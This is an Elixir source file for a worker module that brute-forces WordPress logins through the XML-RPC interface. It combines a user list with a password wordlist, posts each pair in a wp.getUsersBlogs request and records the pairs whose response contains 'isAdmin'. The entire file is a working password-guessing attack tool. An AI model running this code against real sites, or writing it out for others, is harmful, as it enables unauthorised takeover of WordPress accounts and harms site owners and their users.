defmodule WpXmlrpcry.Worker do

  @pattern ~r/isAdmin/i

  def start(progress_channel, [url: url, users: users, wordlist: wordlist]) do
    result =
      combine_user_pass(users, wordlist)
      |> do_login(url, [])
      |> prepare_result_statistics(url)

    send(progress_channel, result)
  end

  def prepare_result_statistics(result, url) do
    {success, error} = Enum.split_with(result, fn attempt -> attempt[:success] == true end)

    %{
      url: url,
      total_tries: Enum.count(success) + Enum.count(error),
      credentials: success
    }
  end

  def do_login([%{username: user, password: pass} | user_and_pass], url, acc) do
    ret =
      with payload <- generate_payload(username: user, password: pass),
        {:ok, response} <- send_request(payload, url),
        parsed_body <- parse_response(response),
        true <- logged_in?(parsed_body) do
          %{username: user, password: pass, success: true}
      else
        _ ->
          %{username: user, password: pass, success: false}
      end

    do_login(user_and_pass, url, [ret | acc])
  end
  def do_login([], _url, acc), do: acc

  def send_request(payload, url) do
    HTTPoison.post(url, payload, [{"Content-Type", "application/xml"}])
  end

  def parse_response(%HTTPoison.Response{body: body}), do: body

  def logged_in?(body), do: String.match?(body, @pattern)

  def generate_payload(username: u, password: p) do
    """
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value><string>#{u}</string></value></param>
        <param><value><string>#{p}</string></value></param>
      </params>
    </methodCall>
    """
  end

  def combine_user_pass(user, passwords) when is_binary(user), do: combine_user_pass([user], passwords)
  def combine_user_pass(users, passwords) do
    for user <- users, password <- passwords, do: %{username: user, password: password}
  end
end
